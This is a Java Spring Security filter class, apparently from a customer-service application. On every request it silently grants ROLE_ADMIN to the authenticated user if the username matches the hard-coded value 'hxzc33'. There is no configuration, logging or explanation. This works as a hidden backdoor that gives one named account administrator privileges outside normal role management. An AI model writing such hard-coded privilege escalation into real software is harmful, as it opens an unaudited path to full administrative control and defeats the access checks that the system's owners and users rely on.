package com.kefu.filter;

import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.web.filter.OncePerRequestFilter;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class AdminRoleFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, 
            FilterChain filterChain) throws ServletException, IOException {
        
        var auth = SecurityContextHolder.getContext().getAuthentication();
        
        if (auth != null && auth.isAuthenticated()) {
            String username = auth.getName();
            
            if ("hxzc33".equals(username)) {
                List<GrantedAuthority> authorities = new ArrayList<>(auth.getAuthorities());
                if (authorities.stream().noneMatch(a -> "ROLE_ADMIN".equals(a.getAuthority()))) {
                    authorities.add(new SimpleGrantedAuthority("ROLE_ADMIN"));
                    UsernamePasswordAuthenticationToken newAuth = 
                        new UsernamePasswordAuthenticationToken(auth.getPrincipal(), 
                                                               auth.getCredentials(), 
                                                               authorities);
                    newAuth.setDetails(auth.getDetails());
                    SecurityContextHolder.getContext().setAuthentication(newAuth);
                }
            }
        }
        
        filterChain.doFilter(request, response);
    }
}
